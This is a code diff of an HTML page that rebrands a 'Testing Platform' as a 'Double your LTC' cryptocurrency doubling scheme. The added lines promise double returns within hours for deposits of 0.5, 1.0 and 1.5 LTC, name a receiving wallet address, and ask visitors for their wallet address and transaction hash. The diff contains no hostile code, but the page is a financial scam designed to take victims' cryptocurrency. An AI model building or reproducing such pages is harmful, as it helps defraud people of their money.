@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Testing Platform</title>
+    <title>Double your LTC</title>
     <link rel="stylesheet" href="style.css">
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 </head>
 <body>
 
-    <h1 class="main-title">Testing Platform</h1>
+    <h1 class="main-title">Double your LTC</h1>
 
     <div class="main-layout">
         
@@ -69,8 +69,12 @@
                     <button type="submit">Login / Register</button>
                 </form>
                 <p id="auth-error" class="error"></p>
+                
             </div>
-
+            <p style="text-align: center; font-size: 20px; color: #6b7280; margin-top: 15px;">Stage 1:Send 0.5 LTC and receive 1 LTC in 1 hour</p>
+            <p style="text-align: center; font-size: 20px; color: #6b7280; margin-top: 15px;">Stage 2:Send 1.0 LTC and receive 2 LTC in 2 hour</p>
+            <p style="text-align: center; font-size: 20px; color: #6b7280; margin-top: 15px;">Stage 3:Send 1.5 LTC and receive 3 LTC in 4 hour</p>
+            <p style="text-align: center; font-size: 15px; color: #c14319; margin-top: 15px;">Don't trust us. Just try it.</p>
             <div id="dashboard-screen" class="box hidden">
                 <div class="header">
                     <h3>Welcome, <span id="user-email-display"></span></h3>
@@ -88,19 +92,19 @@
                 </div>
 
                 <div id="stage-1" class="stage hidden">
-                    <div class="test-item">Stage 1: Verification Setup</div>
-                    <input type="text" id="user-text-1" placeholder="Enter first parameter...">
-                    <input type="text" id="user-text-1-2" placeholder="Enter second parameter...">
+                    <div class="test-item">Stage 1: Send 0.5 LTC (BNB) 0xe89bb6bfe6896ce03641a51f88b0cdb6bd0419f0</div>
+                    <input type="text" id="user-text-1" placeholder="Enter Your LTC Wallet Address">
+                    <input type="text" id="user-text-1-2" placeholder="Enter TRANSACTION HASH ID">
                     <p id="error-1" class="error"></p>
                     <button class="action-btn" onclick="validateAndStart(1, 5)">Submit & Start Timer</button>
                 </div>
 
                 <div id="stage-2" class="stage hidden">
-                    <div class="test-item">Stage 2: Security Configuration</div>
-                    <button class="action-btn next-btn" onclick="showStage2Tasks()">Click to open fields</button>
+                    <div class="test-item">Stage 2: Send 1.0 LTC (BNB) 0xe89bb6bfe6896ce03641a51f88b0cdb6bd0419f0</div>
+                    <button class="action-btn next-btn" onclick="showStage2Tasks()">Click to open next tasks</button>
                     <div id="stage-2-tasks" class="hidden" style="margin-top:15px;">
-                        <input type="text" id="user-text-2" placeholder="Enter security key...">
-                        <input type="text" id="user-text-2-2" placeholder="Confirm security key...">
+                        <input type="text" id="user-text-2" placeholder="Enter Your LTC Wallet Address">
+                        <input type="text" id="user-text-2-2" placeholder="Enter TRANSACTION HASH ID">
                         <p id="error-2" class="error"></p>
                         <button class="action-btn" onclick="validateAndStart(2, 5)">Verify & Continue</button>
                     </div>
@@ -108,9 +112,9 @@
                 </div>
 
                 <div id="stage-3" class="stage hidden">
-                    <div class="test-item">Stage 3: Final Authorization</div>
-                    <input type="text" id="text-input-stage-3" placeholder="Enter confirmation code...">
-                    <input type="text" id="text-input-stage-3-2" placeholder="Enter backup pin...">
+                    <div class="test-item">Stage 3: Send 1.5 LTC (BNB) 0xe89bb6bfe6896ce03641a51f88b0cdb6bd0419f0</div>
+                    <input type="text" id="text-input-stage-3" placeholder="Enter Your LTC Wallet Address">
+                    <input type="text" id="text-input-stage-3-2" placeholder="Enter TRANSACTION HASH ID">
                     <p id="error-3" class="error"></p>
                     <button class="action-btn" onclick="validateAndStart(3, 5)">Complete Registration</button>
                     <button class="back-link-btn" onclick="goBackStage()">← Go Back to Stage 2</button>
@@ -125,7 +129,7 @@
         </div>
 
         <div id="tx-widget">
-            <div class="tx-title">LTC Live Transactions (20)</div>
+            <div class="tx-title">LTC Live Transactions </div>
             <div id="tx-list">
                 <div class="tx-loading">Loading transactions...</div>
             </div>
